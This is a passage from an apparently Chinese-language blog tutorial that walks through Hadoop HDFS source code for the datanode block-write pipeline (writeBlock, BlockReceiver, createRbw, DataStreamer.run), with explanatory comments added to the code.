PBHelperClient.convert(proto.getHeader().getBaseHeader().getToken()),</span><br><span class="line">        proto.getHeader().getClientName(),</span><br><span class="line">        targets,</span><br><span class="line">        PBHelperClient.convertStorageTypes(proto.getTargetStorageTypesList(), targets.length),</span><br><span class="line">        PBHelperClient.convert(proto.getSource()),</span><br><span class="line">        fromProto(proto.getStage()),</span><br><span class="line">        proto.getPipelineSize(),</span><br><span class="line">        proto.getMinBytesRcvd(), proto.getMaxBytesRcvd(),</span><br><span class="line">        proto.getLatestGenerationStamp(),</span><br><span class="line">        fromProto(proto.getRequestedChecksum()),</span><br><span class="line">        (proto.hasCachingStrategy() ?</span><br><span class="line">            getCachingStrategy(proto.getCachingStrategy()) :</span><br><span class="line">          CachingStrategy.newDefaultStrategy()),</span><br><span class="line">        (proto.hasAllowLazyPersist() ? proto.getAllowLazyPersist() : <span class="keyword">false</span>),</span><br><span class="line">        (proto.hasPinning() ? proto.getPinning(): <span class="keyword">false</span>),</span><br><span class="line">        (PBHelperClient.convertBooleanList(proto.getTargetPinningsList())),</span><br><span class="line">        proto.getStorageId(),</span><br><span class="line">        proto.getTargetStorageIdsList().toArray(<span class="keyword">new</span> String[<span class="number">0</span>]));</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (traceScope != <span class="keyword">null</span>) traceScope.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl +alt +b 查找writeBlock的实现类DataXceiver.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeBlock</span><span class="params">(... ...)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Replica replica;</span><br><span class="line">    <span class="keyword">if</span> (isDatanode || </span><br><span class="line">        stage != BlockConstructionStage.PIPELINE_CLOSE_RECOVERY) &#123;</span><br><span class="line">      <span class="comment">// open a block receiver</span></span><br><span class="line">    <span class="comment">// 创建一个BlockReceiver</span></span><br><span class="line">      setCurrentBlockReceiver(getBlockReceiver(block, storageType, in,</span><br><span class="line">          peer.getRemoteAddressString(),</span><br><span class="line">          peer.getLocalAddressString(),</span><br><span class="line">          stage, latestGenerationStamp, minBytesRcvd, maxBytesRcvd,</span><br><span class="line">          clientname, srcDataNode, datanode, requestedChecksum,</span><br><span class="line">          cachingStrategy, allowLazyPersist, pinning, storageId));</span><br><span class="line">      replica = blockReceiver.getReplica();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      replica = datanode.data.recoverClose(</span><br><span class="line">          block, latestGenerationStamp, minBytesRcvd);</span><br><span class="line">    &#125;</span><br><span class="line">    storageUuid = replica.getStorageUuid();</span><br><span class="line">    isOnTransientStorage = replica.isOnTransientStorage();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Connect to downstream machine, if appropriate</span></span><br><span class="line">    <span class="comment">// 继续连接下游的机器</span></span><br><span class="line">    <span class="keyword">if</span> (targets.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      InetSocketAddress mirrorTarget = <span class="keyword">null</span>;</span><br><span class="line">      <span class="comment">// Connect to backup machine</span></span><br><span class="line">      mirrorNode = targets[<span class="number">0</span>].getXferAddr(connectToDnViaHostname);</span><br><span class="line">      LOG.debug(<span class="string">"Connecting to datanode &#123;&#125;"</span>, mirrorNode);</span><br><span class="line">      mirrorTarget = NetUtils.createSocketAddr(mirrorNode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向新的副本发送socket</span></span><br><span class="line">      mirrorSock = datanode.newSocket();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        ... ...</span><br><span class="line">        <span class="keyword">if</span> (targetPinnings != <span class="keyword">null</span> &amp;&amp; targetPinnings.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 往下游socket发送数据</span></span><br><span class="line">          <span class="keyword">new</span> Sender(mirrorOut).writeBlock(originalBlock, targetStorageTypes[<span class="number">0</span>],</span><br><span class="line">              blockToken, clientname, targets, targetStorageTypes,</span><br><span class="line">              srcDataNode, stage, pipelineSize, minBytesRcvd, maxBytesRcvd,</span><br><span class="line">              latestGenerationStamp, requestedChecksum, cachingStrategy,</span><br><span class="line">              allowLazyPersist, targetPinnings[<span class="number">0</span>], targetPinnings,</span><br><span class="line">              targetStorageId, targetStorageIds);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">new</span> Sender(mirrorOut).writeBlock(originalBlock, targetStorageTypes[<span class="number">0</span>],</span><br><span class="line">              blockToken, clientname, targets, targetStorageTypes,</span><br><span class="line">              srcDataNode, stage, pipelineSize, minBytesRcvd, maxBytesRcvd,</span><br><span class="line">              latestGenerationStamp, requestedChecksum, cachingStrategy,</span><br><span class="line">              allowLazyPersist, <span class="keyword">false</span>, targetPinnings,</span><br><span class="line">              targetStorageId, targetStorageIds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mirrorOut.flush();</span><br><span class="line"></span><br><span class="line">        DataNodeFaultInjector.get().writeBlockAfterFlush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read connect ack (only for clients, not for replication req)</span></span><br><span class="line">        <span class="keyword">if</span> (isClient) &#123;</span><br><span class="line">          BlockOpResponseProto connectAck =</span><br><span class="line">            BlockOpResponseProto.parseFrom(PBHelperClient.vintPrefixed(mirrorIn));</span><br><span class="line">          mirrorInStatus = connectAck.getStatus();</span><br><span class="line">          firstBadLink = connectAck.getFirstBadLink();</span><br><span class="line">          <span class="keyword">if</span> (mirrorInStatus != SUCCESS) &#123;</span><br><span class="line">            LOG.debug(<span class="string">"Datanode &#123;&#125; got response for connect"</span> +</span><br><span class="line">                <span class="string">"ack  from downstream datanode with firstbadlink as &#123;&#125;"</span>,</span><br><span class="line">                targets.length, firstBadLink);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      … …</span><br><span class="line"></span><br><span class="line">  <span class="comment">//update metrics</span></span><br><span class="line">  datanode.getMetrics().addWriteBlockOp(elapsed());</span><br><span class="line">  datanode.getMetrics().incrWritesFromClient(peer.isLocal(), size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BlockReceiver <span class="title">getBlockReceiver</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> ExtendedBlock block, <span class="keyword">final</span> StorageType storageType,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> DataInputStream in,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String inAddr, <span class="keyword">final</span> String myAddr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> BlockConstructionStage stage,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">long</span> newGs, <span class="keyword">final</span> <span class="keyword">long</span> minBytesRcvd, <span class="keyword">final</span> <span class="keyword">long</span> maxBytesRcvd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String clientname, <span class="keyword">final</span> DatanodeInfo srcDataNode,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> DataNode dn, DataChecksum requestedChecksum,</span></span></span><br><span class="line"><span class="function"><span class="params">    CachingStrategy cachingStrategy,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">boolean</span> allowLazyPersist,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">boolean</span> pinning,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String storageId)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> BlockReceiver(block, storageType, in,</span><br><span class="line">      inAddr, myAddr, stage, newGs, minBytesRcvd, maxBytesRcvd,</span><br><span class="line">      clientname, srcDataNode, dn, requestedChecksum,</span><br><span class="line">      cachingStrategy, allowLazyPersist, pinning, storageId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BlockReceiver(<span class="keyword">final</span> ExtendedBlock block, <span class="keyword">final</span> StorageType storageType,</span><br><span class="line">  <span class="keyword">final</span> DataInputStream in,</span><br><span class="line">  <span class="keyword">final</span> String inAddr, <span class="keyword">final</span> String myAddr,</span><br><span class="line">  <span class="keyword">final</span> BlockConstructionStage stage, </span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">long</span> newGs, <span class="keyword">final</span> <span class="keyword">long</span> minBytesRcvd, <span class="keyword">final</span> <span class="keyword">long</span> maxBytesRcvd, </span><br><span class="line">  <span class="keyword">final</span> String clientname, <span class="keyword">final</span> DatanodeInfo srcDataNode,</span><br><span class="line">  <span class="keyword">final</span> DataNode datanode, DataChecksum requestedChecksum,</span><br><span class="line">  CachingStrategy cachingStrategy,</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">boolean</span> allowLazyPersist,</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">boolean</span> pinning,</span><br><span class="line">  <span class="keyword">final</span> String storageId) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (isDatanode) &#123; <span class="comment">//replication or move</span></span><br><span class="line">    replicaHandler =</span><br><span class="line">        datanode.data.createTemporary(storageType, storageId, block, <span class="keyword">false</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (stage) &#123;</span><br><span class="line">    <span class="keyword">case</span> PIPELINE_SETUP_CREATE:</span><br><span class="line">    <span class="comment">// 创建管道</span></span><br><span class="line">      replicaHandler = datanode.data.createRbw(storageType, storageId,</span><br><span class="line">          block, allowLazyPersist);</span><br><span class="line">      datanode.notifyNamenodeReceivingBlock(</span><br><span class="line">          block, replicaHandler.getReplica().getStorageUuid());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unsupported stage "</span> + stage + </span><br><span class="line">          <span class="string">" while receiving block "</span> + block + <span class="string">" from "</span> + inAddr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ReplicaHandler <span class="title">createRbw</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    StorageType storageType, String storageId, ExtendedBlock b,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> allowLazyPersist)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> (AutoCloseableLock lock = datasetLock.acquire()) &#123;</span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">      ref = volumes.getNextVolume(storageType, storageId, b.getNumBytes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FsVolumeImpl v = (FsVolumeImpl) ref.getVolume();</span><br><span class="line">    <span class="comment">// create an rbw file to hold block in the designated volume</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (allowLazyPersist &amp;&amp; !v.isTransientStorage()) &#123;</span><br><span class="line">      datanode.getMetrics().incrRamDiskBlocksWriteFallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReplicaInPipeline newReplicaInfo;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建输出流的临时写文件 </span></span><br><span class="line">      newReplicaInfo = v.createRbw(b);</span><br><span class="line">      <span class="keyword">if</span> (newReplicaInfo.getReplicaInfo().getState() != ReplicaState.RBW) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"CreateRBW returned a replica of state "</span></span><br><span class="line">            + newReplicaInfo.getReplicaInfo().getState()</span><br><span class="line">            + <span class="string">" for block "</span> + b.getBlockId());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      IOUtils.cleanup(<span class="keyword">null</span>, ref);</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    volumeMap.add(b.getBlockPoolId(), newReplicaInfo.getReplicaInfo());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReplicaHandler(newReplicaInfo, ref);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ReplicaHandler <span class="title">createRbw</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    StorageType storageType, String storageId, ExtendedBlock b,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> allowLazyPersist)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> (AutoCloseableLock lock = datasetLock.acquire()) &#123;</span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 有可能有多个临时写文件</span></span><br><span class="line">      ref = volumes.getNextVolume(storageType, storageId, b.getNumBytes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FsVolumeImpl v = (FsVolumeImpl) ref.getVolume();</span><br><span class="line">    <span class="comment">// create an rbw file to hold block in the designated volume</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (allowLazyPersist &amp;&amp; !v.isTransientStorage()) &#123;</span><br><span class="line">      datanode.getMetrics().incrRamDiskBlocksWriteFallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReplicaInPipeline newReplicaInfo;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建输出流的临时写文件 </span></span><br><span class="line">      newReplicaInfo = v.createRbw(b);</span><br><span class="line">      <span class="keyword">if</span> (newReplicaInfo.getReplicaInfo().getState() != ReplicaState.RBW) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"CreateRBW returned a replica of state "</span></span><br><span class="line">            + newReplicaInfo.getReplicaInfo().getState()</span><br><span class="line">            + <span class="string">" for block "</span> + b.getBlockId());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      IOUtils.cleanup(<span class="keyword">null</span>, ref);</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    volumeMap.add(b.getBlockPoolId(), newReplicaInfo.getReplicaInfo());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReplicaHandler(newReplicaInfo, ref);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ReplicaInPipeline <span class="title">createRbw</span><span class="params">(ExtendedBlock b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  File f = createRbwFile(b.getBlockPoolId(), b.getLocalBlock());</span><br><span class="line">  LocalReplicaInPipeline newReplicaInfo = <span class="keyword">new</span> ReplicaBuilder(ReplicaState.RBW)</span><br><span class="line">      .setBlockId(b.getBlockId())</span><br><span class="line">      .setGenerationStamp(b.getGenerationStamp())</span><br><span class="line">      .setFsVolume(<span class="keyword">this</span>)</span><br><span class="line">      .setDirectoryToUse(f.getParentFile())</span><br><span class="line">      .setBytesToReserve(b.getNumBytes())</span><br><span class="line">      .buildLocalReplicaInPipeline();</span><br><span class="line">  <span class="keyword">return</span> newReplicaInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-客户端接收DN写数据应答Response">3.5 客户端接收DN写数据应答Response</h3><p>全局查找DataStreamer，搜索run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> lastPacket = Time.monotonicNow();</span><br><span class="line">  TraceScope scope = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (!streamerClosed &amp;&amp; dfsClient.clientRunning) &#123;</span><br><span class="line">    <span class="comment">// if the Responder encountered an error, shutdown Responder</span></span><br><span class="line">    <span class="keyword">if</span> (errorState.hasError()) &#123;</span><br><span class="line">    closeResponder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DFSPacket one;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// process datanode IO errors if any</span></span><br><span class="line">    <span class="keyword">boolean</span> doSleep = processDatanodeOrExternalError();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> halfSocketTimeout = dfsClient.getConf().getSocketTimeout()/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">      <span class="comment">// wait for a packet to be sent.</span></span><br><span class="line">      <span class="keyword">long</span> now = Time.monotonicNow();</span><br><span class="line">      <span class="keyword">while</span> ((!shouldStop() &amp;&amp; dataQueue.size() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (stage != BlockConstructionStage.DATA_STREAMING ||</span><br><span class="line">          now - lastPacket &lt; halfSocketTimeout)) || doSleep) &#123;</span><br><span class="line">      <span class="keyword">long</span> timeout = halfSocketTimeout - (now-lastPacket);</span><br><span class="line">      timeout = timeout &lt;= <span class="number">0</span> ? <span class="number">1000</span> : timeout;</span><br><span class="line">      timeout = (stage == BlockConstructionStage.DATA_STREAMING)?</span><br><span class="line">        timeout : <span class="number">1000</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果dataQueue里面没有数据，代码会阻塞在这儿</span></span><br><span class="line">        dataQueue.wait(timeout); <span class="comment">// 接收到notify消息</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException  e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">      doSleep = <span class="keyword">false</span>;</span><br><span class="line">      now = Time.monotonicNow();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (shouldStop()) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// get packet to be sent.</span></span><br><span class="line">      <span class="keyword">if</span> (dataQueue.isEmpty()) &#123;</span><br><span class="line">      one = createHeartbeatPacket();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        backOffIfNecessary();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//  队列不为空，从队列中取出packet</span></span><br><span class="line">      one = dataQueue.getFirst(); <span class="comment">// regular data packet</span></span><br><span class="line">      SpanId[] parents = one.getTraceParents();</span><br><span class="line">      <span class="keyword">if</span> (parents.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        scope = dfsClient.getTracer().</span><br><span class="line">          newScope(<span class="string">"dataStreamer"</span>, parents[<span class="number">0</span>]);</span><br><span class="line">        scope.getSpan().setParents(parents);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get new block from namenode.</span></span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">      LOG.debug(<span class="string">"stage="</span> + stage + <span class="string">", "</span> + <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stage == BlockConstructionStage.PIPELINE_SETUP_CREATE) &#123;</span><br><span class="line">      LOG.debug(<span class="string">"Allocating new block: &#123;&#125;"</span>, <span class="keyword">this</span>);</span><br><span class="line">      <span class="comment">// 步骤一：向NameNode 申请block 并建立数据管道</span></span><br><span class="line">      setPipeline(nextBlockOutputStream());</span><br><span class="line">      <span class="comment">// 